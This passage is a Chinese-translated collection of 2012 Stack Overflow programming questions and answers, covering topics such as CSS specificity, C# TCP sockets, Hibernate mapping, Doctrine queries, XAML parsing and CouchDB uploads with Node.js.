> 
> 时间：2012-12-19T17:02:10.623

如果不是边框，则可能是边距。尝试给`<li>`

```
margin:0; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:05:19.487

尝试设置

```
border : 0;
outline : 0;
padding : 0;
margin : 0; 
```

应该这样做...

# javascript - 我可以防止覆盖 CSS 样式吗？

> ID：13957316
> 
> 赞同：12
> 
> 时间：2012-12-19T16:57:49.440
> 
> 标签：javascript, jquery, html, css

我想在页面加载时将 CSS 应用于某些链接按钮，但其中一个`<a id="lb1">logoff</a>`必须保持其样式，没有悬停或其他事件必须更改其样式。

链接按钮没有类，并且应用于所有这些的 css 是对标签完成的，这样：

```
a
{
 //style
}

a:hover
{
  // style
} 
```

是否可以？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-19T17:06:24.483

不，你不能。

您可以使用更具体的选择器（甚至是带有 style 属性的内联 CSS），这样它们就不太可能被意外覆盖。

您可以使用（呃）大锤，`!important`因此它们只会被另一条`!important`规则覆盖。

但是，没有办法阻止它们被覆盖。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-19T17:11:35.803

请请请请请尽量避免使用`!important`。你会遇到很多烦人的问题和使用它的问题。我认为这是一个非常懒惰的黑客。

您想要做的是将一个类附加到您不想被覆盖的链接。类的优先级高于一般选择器（例如`a`, `p`, `b`）。因此，如果您将此类附加到链接，CSS 将覆盖您设置的默认 CSS `a`。

CSS：

```
a {
color: red;
}
a:hover {
color: blue;
}
.derp:hover { /*you can add everything you want to preserve here, essentially make it the same as the link css. you can also change it to #lbl:hover, although there's no good reason to be using an ID as a CSS selector*/
color: red;
} 
```

HTML：

```
<a href="#">this will turn blue on hover</a>

<a class="derp" href="#">this will stay red on hover</a> 
```

这是一个向你展示的小提琴。第二个链接附加了一个保留原始样式的类：http: [//jsfiddle.net/p6QWq/](http://jsfiddle.net/p6QWq/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-19T16:59:58.820

为什么不将 a 添加`class`到您想要更改的所有链接按钮，而不将其添加到您不想更改的按钮。

然后你可以调用：

```
 $(".myClass").css("backgound-color", "blue"); 
```

*   这会将具有类的每个元素的背景颜色更改为`myClass`蓝色背景。

或者您可以将一个全新的类添加到具有以下类的链接按钮`myClass`：

```
 $(".myClass").addClass("myExtraClass"); 
```

*   这将使`class`您的链接按钮的属性`class="myclass myExtraClass"`

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-19T17:11:44.827

看到您发布的代码可以让您更清楚地了解您想要做什么。试试这个：

```
a {
    text-decoration: none;
    color: orange;
}
a:hover {
    text-decoration: underline;
    color: blue;
} 
```

这会将默认样式应用于所有`<a>`元素。现在，您可以通过为具有上面给出的 id 的锚提供特定样式来覆盖此默认样式：

```
#lb1 {
    color: black;
    text-decoration: none;
}
#lb1:hover {
    color: black;
    text-decoration: none;
} 
```

我用一个快速而肮脏的[jsFiddle 模拟](http://jsfiddle.net/TA3db/)了这个。看看这是否会给你想要的结果。ID 优先于类和默认元素样式。因此，如果您有一个想要保持不变的元素，请相应地应用和标识特定元素并为其设置样式。这也可以帮助您避免将类应用于多个元素。应用一个 ID 比应用十二个类的编码更少。（只是一个夸张的例子。我不知道你有多少链接。）

希望这可以帮助。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-19T17:04:40.460

css 根据定义是**级联**的，因此您应用于标签的任何样式都将应用于这个特定的样式，除非您覆盖它。

您必须为所有其他按钮分配一个类或覆盖此特定按钮的所有默认属性。

另外，不要忘记伪类 :visited 和 :active。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-19T17:03:37.420

你应该`!important`在你的css中使用：

```
a {
    /* style */
    background: #FFF !important;
}

a:hover {
    /* style */
    background: #FFF !important;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-19T20:11:26.657

您总是可以通过简单地创建另一个样式表并将其放在 html 头部的样式表链接的末尾来覆盖您的 css。

```
<head>
    <link rel="stylesheet" href="location/location/first_stylesheet.css">
    <link rel="stylesheet" href="location/location/revised_stylesheet.css">
</head> 
```

然而，这不是覆盖你的 CSS 的最有效的方法；最好通过简单地附加带有类属性的元素来消除这种单独样式表的必要性。类 attr 将允许您修改基本的 html 元素、标签并覆盖最后一层以“统治它们”。享受！

# reportbuilder3.0 - 如何将主题应用于报表生成器 tablix？

> ID：13957318
> 
> 赞同：2
> 
> 时间：2012-12-19T16:57:59.143
> 
> 标签：reportbuilder3.0

我在报表生成器中创建了一个报表，如何将主题应用于我的表格？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T10:38:49.067

我发现最好使用向导并在使用时选择一个主题。之后应用主题很困难，因为它必须手动完成。

# knockout.js - 在 selenium ide 中使用淘汰赛动态创建的测试项目，最好的方法是什么？

> ID：13957319
> 
> 赞同：0
> 
> 时间：2012-12-19T16:58:00.330
> 
> 标签：knockout.js, selenium-ide

测试动态创建的项目的最佳方法是什么？我不想使用classe，所以将来可以更改，并且id是通过淘汰赛动态创建的，我正在使用自定义属性然后

```
xpath=(//input[@section-id="entry_input"])[1] 
```

这是一个不好的做法吗？在此先感谢我是stackoverflow的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T21:48:05.543

我认为你最好测试 ViewModel，我们在我当前的项目（企业规模）中这样做，它工作得很好，很少有错误。

我们使用 Qunit 进行测试，但 Jasmine 也可以。大多数错误发生在 ViewModel 中，如果您有高级自定义绑定，您可以单独测试它们。

# c# - EndRead 抛出 IO 异常

> ID：13957321
> 
> 赞同：1
> 
> 时间：2012-12-19T16:58:08.357
> 
> 标签：c#, .net, sockets, exception

这是用于 MoSync 应用程序和外部 DLL 之间的本地通信，MoSync 不允许我使用第 3 部分 DLL，这就是为什么我必须实现这个桥接软件而不是使用对 DLL 的简单调用的原因，我必须从 xml 转换为 DLL 消息格式，然后再转换为 XML。我知道这是一件愚蠢的事情，不幸的是没有改变架构的灵活性。最初我以为只有一个请求，所以我有 Sync coms，但现在我发现可以有多个请求，所以我需要再次实现 Async。

我有一个不时抛出的异常，因为我是 C# 新手，所以我无法找到内存泄漏......也许一双训练有素的眼睛可以找到问题

源代码：

我编写了以下代码，我对 C# 和 Sockets 还很陌生，所以也许我犯了一些只有更有经验的眼睛才能发现的大错误。这是在 Windows Mobile 6.1 设备中使用的，所以我试图避免使用很多线程。

```
using System;

using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Diagnostics;

namespace SmartDevice_Server
{
    //ClientConnection saves connection information is used to keep context in Async and Event calls
    public class ClientConnection : EventArgs
    {
        public NetworkStream NetworkStream { get; private set; }
        public byte[] Data { get; private set; }
        public int byteReadCount { get; set; }

        public ClientConnection(NetworkStream networkStream, byte[] data)
        {
            NetworkStream = networkStream;
            Data = data;
        }
    }

    //MySocket - Is a server that listens for events and triggers Events upon Request Completion 
    public class MySocketTCP
    {
        #region Class Members
        TcpListener myTcpListener;
        TcpClient myTcpClient;
        NetworkStream myNetworkStream;

        const string localHost = "127.0.0.1";
        IPAddress myAddress = IPAddress.Parse(localHost);
        int myPortNumber = 58889;
        byte[] myData;

        int bytesReadCount;
        const int MIN_REQUEST_STRING_SIZE = 10;

        int TimeStart;

        //Event
        public event socketReadCompleteHandler socketReadCompleteEvent;
        public EventArgs eventArguments = null;
        public delegate void socketReadCompleteHandler(MySocketTCP myTcpSocket, ClientConnection eventArguments);

        #endregion

        //Constructor
        public MySocketTCP()
        {
            Init();
        }

        //Constructor overloaded to receive IPAdress Host, and Port number
        public MySocketTCP(IPAddress hostAddress, int portNumber)
        {
            myAddress = hostAddress;
            myPortNumber = portNumber;

            Init();
        }

        //Initializes the TCPListner
        public void Init()
        {
            try
            {
                myTcpListener = new TcpListener(myAddress, myPortNumber);

                //myNetworkStream = myTcpClient.GetStream();
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        /*TODO_Listener_Timer: After you accept a connection you wait for data to be Read indefinitely
         *Possible solution: Use a timeout to close the socket connection.
         *Check WIKI, TODOS
         * */
        //Listens Asynchronously to Clients, class a recieveMessageHandler to process the read
        public void ListenAsync()
        {
            myTcpListener.Start();

            while (true)
            {
                //blocks until a client has connected to the server
                myTcpClient = myTcpListener.AcceptTcpClient();

                var client = new ClientConnection(myTcpClient.GetStream(), new byte[myTcpClient.ReceiveBufferSize]);

                // Capture the specific client and pass it to the receive handler
                client.NetworkStream.BeginRead(client.Data, 0, client.Data.Length, r => receiveMessageHandler(r, client), null);
            }
        }

        //Callback is used to Process the request Asynchronously, triggers socketReadCompleteEvent
        public void receiveMessageHandler(IAsyncResult asyncResult, ClientConnection clientInstance)
        {
            bytesReadCount = 0;

            lock (clientInstance.NetworkStream)
            {
                try
                {
                    bytesReadCount = clientInstance.NetworkStream.EndRead(asyncResult);
                    clientInstance.byteReadCount = bytesReadCount;
                }
                catch (Exception exc)
                {
                    throw exc;
                }
            }

            if (bytesReadCount < MIN_REQUEST_STRING_SIZE)
            {
                //Could not read form client.
                Debug.WriteLine("NO DATA READ");
            }
            else
            {
                if (socketReadCompleteEvent != null)
                {
                    socketReadCompleteEvent(this, clientInstance);
                }
            }
        }

        //Reads the request, uses the ClientConnection for context
        public string ReadAsync(ClientConnection connObj)
        {
            int bytesReadCount = connObj.byteReadCount;
            byte[] myData = connObj.Data;

            string xmlMessage;

            try
            {
                xmlMessage = Encoding.ASCII.GetString(myData, 0, bytesReadCount);
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return xmlMessage;
        }

        //Deprecated
        public string Read()
        {
            string xmlMessage;

            try
            {
                xmlMessage = Encoding.ASCII.GetString(myData, 0, bytesReadCount);
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return xmlMessage;
        }

        //Deprecated
        public void Write(byte[] outBytes)
        {
            try
            {
                myNetworkStream.Write(outBytes, 0, outBytes.Length);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        //Deprecated
        public void Write(string outMessage)
        {
            byte[] outBytes = Encoding.ASCII.GetBytes(outMessage);

            try
            {
                myNetworkStream.Write(outBytes, 0, outBytes.Length);
            }
            catch (Exception ex)
            {
                throw ex;
            }

            int TimeEnd = Environment.TickCount;
            int TimeResult = TimeEnd - TimeStart;
        }

        //Is used to send the message to the correct socket
        public void WriteAsync(ClientConnection connObj, string outMessage)
        {
            byte[] outBytes = Encoding.ASCII.GetBytes(outMessage);

            try
            {
                connObj.NetworkStream.Write(outBytes, 0, outBytes.Length);
            }
            catch (Exception ex)
            {
                throw ex;
            }

            int TimeEnd = Environment.TickCount;
            int TimeResult = TimeEnd - TimeStart;
        }

        //Closes the client
        public void Close()
        {
            //myNetworkStream.Close();
            try
            {
                myTcpClient.Close();
            }
            catch (Exception ex)
            {

                throw ex;
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:22:10.800

最可能的问题是，您期望对客户端执行的三个“写入”执行三个“读取”。

这是一个错误的假设，因为 TCP 套接字是一个***字节流***并且不保留您的应用程序消息边界。服务器可能会在一次、两次或十七次读取中消耗客户端发送的这三个“消息”。

您需要以某种方式告诉服务器消息在字节流中的结束位置。通常的选择是固定长度的消息、分隔符、告诉有效负载长度的消息头、像 XML 这样的自描述形式等。

因此，您继续从流中读取，直到您有完整的消息要处理，但同时您可能已经将下一条消息的一部分读入缓冲区。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T17:27:16.497

我认为这里的问题是你只持有一个`NetworkStream`( `myNetworkStream`) ，如果第二个客户端在第一个客户端发送数据之前连接，你的接受循环将覆盖`myNetworkStream`第二个连接的流。当第一个客户端然后发送一些数据时，您`receiveMessageHandler`将`EndRead`在*第二个*连接上调用`NetworkStream`（在第二个客户端连接时存储`myNetworkStream`），但从`asyncResult`第*一个*客户端的读取中传递。这会导致您指出的异常。具体来说，当我测试它时，我收到以下消息：

> 无法从传输连接读取数据：IAsyncResult 对象未从此类的相应异步方法返回。参数名称：asyncResult。

尝试进行以下更改：

```
// Create a class to hold details related to a client connection
public class ClientConnection
{
    public ClientConnection(NetworkStream networkStream, byte[] data)
    {
        NetworkStream = networkStream;
        Data = data;
    }

    public NetworkStream NetworkStream { get; private set; }
    public byte[] Data { get; private set; }
}

public void Listen()
{
    myTcpListener.Start();

    while (true)
    {
        //blocks until a client has connected to the server
        myTcpClient = myTcpListener.AcceptTcpClient();

        var client = new ClientConnection(myTcpClient.GetStream(), new byte[myTcpClient.ReceiveBufferSize]);

        // Capture the specific client and pass it to the receive handler
        client.NetworkStream.BeginRead(client.Data, 0, client.Data.Length, r => receiveMessageHandler(r, client), null);
    }
}

public void receiveMessageHandler(IAsyncResult asyncResult, ClientConnection client)
{
    var byteReadCount = client.NetworkStream.EndRead(asyncResult);

    if (byteReadCount < MIN_REQUEST_STRING_SIZE)
    {
        //Could not read form client.
        //Erro - Como tratar? Close()
    }
    else
    {
        if (socketReadCompleteEvent != null)
        {
            socketReadCompleteEvent(this, eventArguments);
        }
    }
} 
```

正如其他人所提到的，还有与您对发送方和接收方之间匹配读/写的期望相关的其他问题，但这似乎是您看到的实际问题的原因。

**编辑：**

这是一个服务器，它将接收数据，并`callback`在收到完整消息时调用一个方法。返回一个字符串，然后将其发送回客户端，客户端使用响应数据`callback`调用自己的。`replyCallback`每个连接只发送一个请求-响应（这是相当低效的，但应该作为一个很好的起点）。

```
public static class Server
{
    public static void Run(int port, Action<string> callback)
    {
        var listener = new TcpListener(IPAddress.Loopback, port);
        listener.Start();

        while (true)
        {
            using (var client = listener.AcceptTcpClient())
            {
                try
                {
                    var buffer = new byte[2048];
                    using (var memoryStream = new MemoryStream())
                    {
                        using (var stream = client.GetStream())
                        {
                            stream.ReadTimeout = 1000; // 1 second timeout
                            int bytesRead;
                            // Loop until Read returns 0, signalling the socket has been closed
                            while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                memoryStream.Write(buffer, 0, bytesRead);
                            }
                        }

                        // Pass the client's message to the callback and use the response as the reply message to the client.
                        var reply = Encoding.UTF8.GetBytes(callback(Encoding.UTF8.GetString(memoryStream.GetBuffer(), 0, (int)memoryStream.Length)));
                        stream.Write(reply, 0, reply.Length);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error: {0}", e.Message);
                }
            }
        }
    }
} 
```

这是一个小型客户端程序，它将连接、发送数据并等待响应。收到响应后，它将通过`replyCallback`服务器响应调用：

```
public static class Client
{
    public static void Run(string hostname, int port, string dataToSend, Action<string> replyCallback)
    {
        using (var client = new TcpClient(hostname, port))
        {
            using (var stream = client.GetStream())
            {
                var buffer = Encoding.UTF8.GetBytes(dataToSend);
                stream.Write(buffer, 0, buffer.Length);
                // Shutdown the send side of the socket, indicating to the server we're done sending our message
                client.Client.Shutdown(SocketShutdown.Send);
                using (var memoryStream = new MemoryStream())
                {
                    stream.ReadTimeout = 1000; // 1 second timeout
                    int bytesRead;
                    // Loop until Read returns 0, signalling the socket has been closed
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        memoryStream.Write(buffer, 0, bytesRead);
                    }
                    replyCallback(Encoding.UTF8.GetString(memoryStream.GetBuffer(), 0, (int)memoryStream.Length));
                }
            }
        }
    }
} 
```

还有一个小测试工具将它们联系在一起：

```
static class Program
{
    static void Main(string[] args)
    {
        var port = 12345;
        ThreadPool.QueueUserWorkItem(o => Server.Run(port, ProcessClientMessage));
        while (true)
        {
            Console.WriteLine("Enter a message to send and hit enter (or a blank line to exit)");
            var data = Console.ReadLine();
            if (string.IsNullOrEmpty(data)) break;
            Client.Run("localhost", port, data, m => Console.WriteLine("Client received server reply: {0}", m));
        }
    }

    private static string ProcessClientMessage(string clientMessage)
    {
        Console.WriteLine("Server received client message: {0}", clientMessage);
        // This callback would ordinarily process the client message, then return a string that will be sent back to the client in response.
        // For now, we'll just return a fixed string value...
        return "This is the server reply...";
    }
} 
```

# google-analytics - Google 电子商务分析（错误？）

> ID：13957323
> 
> 赞同：0
> 
> 时间：2012-12-19T16:58:09.777
> 
> 标签：google-analytics

在启动它之前，我正在我的新电子商务网站上实施 ga。ga 与所有产品完美配合，一切都记录良好，逐个产品检查。

除了一件事之外的一切。

电子商务概述的收入。

出于某种原因，收入，女巫应该来自增加每个产品的收入，不断增加一个几乎随机的巨大数字。

例子：

product1 100.63(单价) 3(units)
product2 70.50(units) 1(units)
product1 115.10(units) 2(units)

该数据与真实订单产生的真实数据完美契合。但是收入说：10,370.22

女巫没有任何意义。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T12:36:24.810

收入不

> 来自增加每件产品的收入

收入来自函数中的`total`字段`_addTrans`（请参阅[文档](https://developers.google.com/analytics/devguides/collection/gajs/methods/gaJSApiEcommerce?hl=fr#_gat.GA_Tracker_._addTrans)）。

# java - 使用休眠命名查询和弹簧填充 DTO 的列表属性

> ID：13957324
> 
> 赞同：1
> 
> 时间：2012-12-19T16:58:16.720
> 
> 标签：java, sql, spring, hibernate, named-query

我想知道是否可以通过休眠实现以下目标。考虑以下 DTO：

```
public class ClassDTO {
    private String className;
    private List<String> studentNames;
    //getters & setters
} 
```

以及以下包含 sql 查询的 hbm 文件：

```
<hibernate-mapping>
    <class name="app.ClassDTO">
        <id name="className" type="java.lang.String" />
        <property name="studentNames" type="java.lang.List" />
    </class>

    <sql-query name="classQuery">
        <return alias="class" class="app.ClassDTO" />
            select classTable.CLASS_NAME AS {class.className}, ST.STUDENT_NAME
             from CLASS classTable
            join STUDENT ST on ST.CLASS_ID=classTable.CLASS_ID
            where ST.age<18
    </sql-query>
</hibernate-mapping> 
```

如果我们在数据库中运行查询，我们将得到以下结果：

```
+----------+------------+
|CLASS_NAME|STUDENT_NAME|
+----------+------------+
|  CS106   |   BILL     |
|  CS106   |   GEORGE   |
|  CS106   |   MICHEL   |
|  ELEC8   |   WILL     |
|  ELEC8   |   MIKE     |
|  ELEC8   |   BETTY    |
+----------+------------+ 
```

如果我们在 hibernate 中运行查询，我们应该得到一个 ClassDTO 对象的列表。但是是否可以通过以下方式初始化这些对象？

```
List<ClassDTO> result = getHibernateTemplate.findByNamedQuery("classQuery").;
resul.size(); //<-- the list size should be 2 (one entry for CS106 and another for ELEC8)
result.get(0).getStudentNames().size(); //<-- the size should be 3 for BILL, GEORGE and MICHEL who are linked to the class CS106 
```

我已经搜索了hibernate文档，但我还没有成功找到任何答案。任何帮助真的很感激。提前谢谢你们。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:58:42.133

如果您进一步规范化您的数据并调整您的映射，您可以让 Hibernate 自动执行此操作：

```
<class name="app.ClassDTO">
    <id name="className" type="java.lang.String" />
    <list name="studentNames" table="class_student">
    <key column="class_name" />
        <element type="string"/>
    </list>
</class> 
```

我承认，如果唯一存在的数据确实是这两列，那么规范化似乎很愚蠢。但在很大程度上，让 Hibernate 自动将平面表数据转换为复杂的对象结构需要遵循某些规则（在这种特殊情况下，我不会称其为最佳实践）。

如果您想保持原样，那么您需要自己创建 ClassDTO，这并不难：

```
final List<Object[]> resultObjects = getSession().getNamedQuery().list();
public Map<String, ClassDTO> resultMap = new HashMap<>(String, ClassDTO);
for (Object[] result : resultObjects) {
    // find ClassDTO in map for class, or create new one
    // add student name to class dto instance
} 
```

# android - 重新启动活动堆栈

> ID：13957326
> 
> 赞同：0
> 
> 时间：2012-12-19T16:58:19.263
> 
> 标签：android, android-activity, call

我有一个应用程序有很多`Actvities`，我需要`activities`用参数调用每个应用程序以从数据库或文件中检索数据，但是如果我第二次调用一个活动，我不希望该活动再次检索数据，因为它对用户来说可能很无聊.

例子 ：

1.  我的主要活动带有可以调用 3 个活动的菜单：A、B 和 C
2.  他们每个人都需要参数来访问数据库
3.  在每个活动中，我都有一个链接可以在它们之间导航，我需要从堆栈中回调活动，因此不需要它们再次访问数据库。

非常感谢任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:09:30.400

如果您没有完成活动，数据将持续存在。你不必做任何额外的事情。否则，您可以扩展 Application 类并将数据保存到那里的某个数据结构中，以后可以随时检索。

# .net - XAML 解析异常

> ID：13957327
> 
> 赞同：3
> 
> 时间：2012-12-19T16:58:24.147
> 
> 标签：.net, wpf, xaml

我写了简单的 XAML 文件：

```
<Window      xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
             mc:Ignorable="d"
             d:DesignHeight="400" d:DesignWidth="250"
             WindowStartupLocation="CenterScreen"
             ResizeMode="NoResize" Title="Окошко" Width="250" Height="400">
    <Grid>
        <!--Настраиваем сетку-->
        <Grid.RowDefinitions>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>
        <!--Теперь по сетке раскидываем контролы-->
        <GroupBox x:Name="listTitle" x:FieldModifier="public" Header="Список элементов:" Margin="5"
                  Padding="5">
            <!--В объекте ListBox указываем, что источником данных для элементов
            списка следует использовать свойство DataContext родительского элемента-->
            <ListBox x:Name="listbox" x:FieldModifier="public"
                     ItemsSource="{Binding}" SelectionMode="Multiple">
                <!--Шаблон отображения элементов списка-->
                <ListBox.ItemTemplate>
                    <DataTemplate>
                        <!--Указываем, что каждый элемент следует отображать
                        в виде текста, который должен считываться из свойства "Value"-->
                        <TextBlock Text="{Binding Path=Value}"/>
                    </DataTemplate>
                </ListBox.ItemTemplate>
            </ListBox>
        </GroupBox>
        <GroupBox Header="Примечание:" Grid.Row="1" Margin="5" Padding="5">
            <TextBlock x:Name="txtNotes" x:FieldModifier="public" TextWrapping="Wrap"/>
        </GroupBox>
        <StackPanel Orientation="Horizontal" Grid.Row="2"
                    HorizontalAlignment="Right">
            <Button x:Name="btnAccept" x:FieldModifier="public" Margin="5"
                    Padding="5" IsDefault="True">Принять</Button>
            <Button x:Name="btnExit" x:FieldModifier="public" Margin="5"
                    Padding="5" IsCancel="True">Выход</Button>
        </StackPanel>
    </Grid>
</Window> 
```

这是一个简单的窗口：

![在此处输入图像描述](../Images/ba991663ce74a84b98c7f561ab73bf9f.png)

我在我的代码中解析这个：

```
using (io.FileStream fs = new io.FileStream(fileFullName, io.FileMode.Open)) {
    depObj = XamlReader.Load(fs) as DependencyObject;
    fs.Close();
} 
```

它在 .NET 4.0 中运行良好，但在 .NET 3.5 SP1 中出现异常：

> System.Windows.Markup.XamlParseException 发生消息=XML 命名空间“ [http://schemas.microsoft.com/winfx/2006/xaml](http://schemas.microsoft.com/winfx/2006/xaml)
> ” 中不存在属性“FieldModifier” 。行'17'位置'38'。

为什么会这样？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:05:15.270

好吧，它也不应该在 .NET 4 中工作，但显然解析器通过忽略您使用`x:FieldModifier`.

根据[MSDN 文档](http://msdn.microsoft.com/en-us/library/aa970905%28v=vs.110%29.aspx)，那么您还必须有一个`x:Class`指令。

> 如果 XAML 产品在任何地方使用 x:FieldModifier，则该 XAML 产品的根元素必须声明 x:Class 指令。

如果您没有声明类/代码隐藏文件并且动态加载 XAML，则使用 x:FieldModifier 毫无意义。

# html - CSS3 中的可滚动表格，但没有可滚动标题

> ID：13957328
> 
> 赞同：0
> 
> 时间：2012-12-19T16:58:28.207
> 
> 标签：html, css

我在 html 中创建了一个可滚动的表格，但我不希望标题是可滚动的。

```
<div style="max-height:80px;width:10%;overflow-y: scroll">
<div style="display:table">
    <div id="table_header" style="display:table-row;background-color:gray"> 
        <div style="display:table-cell"> 
            Name
        </div>
        <div style="display:table-cell"> 
            Age
        </div>
    </div>
    <div style="display:table-row"> 
        <div style="display:table-cell"> 
            Zarazaz 
        </div>
        <div style="display:table-cell"> 
            13 
        </div>
    </div>
    <div style="display:table-row"> 
        <div style="display:table-cell"> 
            Kamuff 
        </div>
        <div style="display:table-cell"> 
            123 
        </div>
    </div>
    <div style="display:table-row">
        <div style="display:table-cell"> 
            Darandund 
        </div>
        <div style="display:table-cell"> 
            145
        </div>
    </div>
    <div style="display:table-row">
        <div style="display:table-cell"> 
            Bazabunzi 
        </div>
        <div style="display:table-cell"> 
            145
        </div>
    </div>
</div>
</div> 
```

我试图将标题放在表格之外，但这样做的问题是列可能会根据内部文本的长度调整大小，然后标题最终会与下面的列不对齐（特别是如果我需要有更多的列）。你建议怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:16:21.070

为此，您可以更好地使用表格。我在互联网上搜索`tbody scrolling`了一些可以进一步帮助您的结果：

*   [信息#1](http://tjvantoll.com/2012/11/10/creating-cross-browser-scrollable-tbody/)
*   [信息#2](http://www.imaputz.com/cssStuff/bigFourVersion.html)
*   [代码笔示例](http://codepen.io/tjvantoll/pen/JEKIu)

# symfony - 使用学说查询生成器进行“不在”查询

> ID：13957330
> 
> 赞同：34
> 
> 时间：2012-12-19T16:58:29.670
> 
> 标签：symfony, doctrine, doctrine-orm, doctrine-query

我试图重现这个查询：

```
SELECT * FROM `request_lines`
where request_id not in(
select requestLine_id from `asset_request_lines` where asset_id = 1 
) 
```

在学说查询生成器中，我被困在 request_id 不在的地方（选择

我目前有：

```
$linked = $em->createQueryBuilder()
        ->select('rl')
        ->from('MineMyBundle:MineRequestLine', 'rl')
        ->where()
        ->getQuery()
        ->getResult(); 
```

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-12-19T17:47:34.053

您需要使用查询构建器表达式，这意味着您需要访问查询构建器对象。此外，如果您提前生成子选择列表，则代码更容易编写：

```
$qb = $em->createQueryBuilder();

$nots = $qb->select('arl')
          ->from('$MineMyBundle:MineAssetRequestLine', 'arl')
          ->where($qb->expr()->eq('arl.asset_id',1))
          ->getQuery()
          ->getResult();

$linked = $qb->select('rl')
             ->from('MineMyBundle:MineRequestLine', 'rl')
             ->where($qb->expr()->notIn('rl.request_id', $nots))
             ->getQuery()
             ->getResult(); 
```

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2015-11-05T11:20:33.097

可以在一个 Doctrine 查询中执行此操作：

```
$qb  = $this->_em->createQueryBuilder();
$sub = $qb;

$sub = $qb->select('arl')
          ->from('$MineMyBundle:MineAssetRequestLine', 'arl')
          ->where($qb->expr()->eq('arl.asset_id',1));

$linked = $qb->select('rl')
             ->from('MineMyBundle:MineRequestLine', 'rl')
             ->where($qb->expr()->notIn('rl.request_id',  $sub->getDQL()))
             ->getQuery()
             ->getResult(); 
```

在此处查看[此答案中的参考](https://stackoverflow.com/a/11925750/1697459)

# javascript - 使用 node.js nano 模块将附件批量上传到 couchDB

> ID：13957334
> 
> 赞同：2
> 
> 时间：2012-12-19T16:58:42.223
> 
> 标签：javascript, node.js, couchdb, attachment, couchdb-nano

我正在尝试使用 node.js 和 nano 将附件批量上传到 CouchDB。首先，walk 模块用于查找上传文件夹中的所有文件并从中创建数组。接下来，数组中的每个文件都应该通过 pipe 和 nano 模块插入到 CouchDB 中。但是，最终的结果是只上传了一个附件。

```
var nano = require('nano')('http://localhost:5984')
var alice = nano.use('alice');
var fs = require('fs');
var walk = require('walk');
var files = [];

// Walker options
var walker = walk.walk('./uploads', {
    followLinks: false
});

// find all files and add to array
walker.on('file', function (root, stat, next) {
    files.push(root + '/' + stat.name);
    next();
});

walker.on('end', function () {
    // files array ["./uploads/2.jpg","./uploads/3.jpg","./uploads/1.jpg"]
    files.forEach(function (file) {
        //extract file name
        fname = file.split("/")[2]

        alice.get('rabbit', {revs_info: true}, function (err, body) {

                fs.createReadStream(file).pipe(

                    alice.attachment.insert('rabbit', fname, null, 'image/jpeg', {
                        rev: body._rev
                    }, function (err, body) {
                        if (!err) console.log(body);
                    })

                )

        });

    });

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:00:54.587

这是因为您将异步 api 与同步的假设混合在一起。

在第一次请求之后，您会遇到冲突，导致 rabbit 文档发生了变化。

你能用 确认这一点`NANO_ENV=testing node yourapp.js`吗？

如果这是问题，我建议使用异步

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T20:58:38.013

```
var nano = require('nano')('http://localhost:5984')
var alice = nano.use('alice');
var fs = require('fs');
var walk = require('walk');
var files = [];

// Walker options
var walker = walk.walk('./uploads', {
    followLinks: false
});

walker.on('file', function (root, stat, next) {
    files.push(root + '/' + stat.name);
    next();
});

walker.on('end', function () {
    series(files.shift());

});

function async(arg, callback) {
    setTimeout(function () {callback(arg); }, 100);
}

function final() {console.log('Done');}

function series(item) {
    if (item) { 
        async(item, function (result) {
            fname = item.split("/")[2]

            alice.get('rabbit', { revs_info: true }, function (err, body) {
                if (!err) {

                    fs.createReadStream(item).pipe(
                    alice.attachment.insert('rabbit', fname, null, 'image/jpeg', {
                        rev: body._rev
                    }, function (err, body) {
                        if (!err) console.log(body);
                    })

                    )

                }
            });

            return series(files.shift());
        });
    } 

    else {
        return final();
    }
} 
```

# ruby - 循环内循环并在深度循环中分配变量

> ID：13957336
> 
> 赞同：4
> 
> 时间：2012-12-19T16:58:47.297
> 
> 标签：ruby, variables, loops, closures

我有一个这样的代码块（这是工作版本）

```
@full_user_schedule[0].attributes.each do |event_name, attending|
   if attending
     sessions_hash.each do |id, name|
       event_name = event_name.sub(name, id.to_s) if event_name.include? name 
     end
     @user_schedule.merge!(event_name => attending)
   end
end 
```

当我尝试`event_id`在`sessions_hash.each`语句中设置变量时，我无法将其分配到该循环之外（收到未知变量警告）。我想知道为什么会这样，以及如何规避它。

下面是一个失败的例子（虽然日志显示变量设置正确），但我无法在创建它的循环之外访问它。

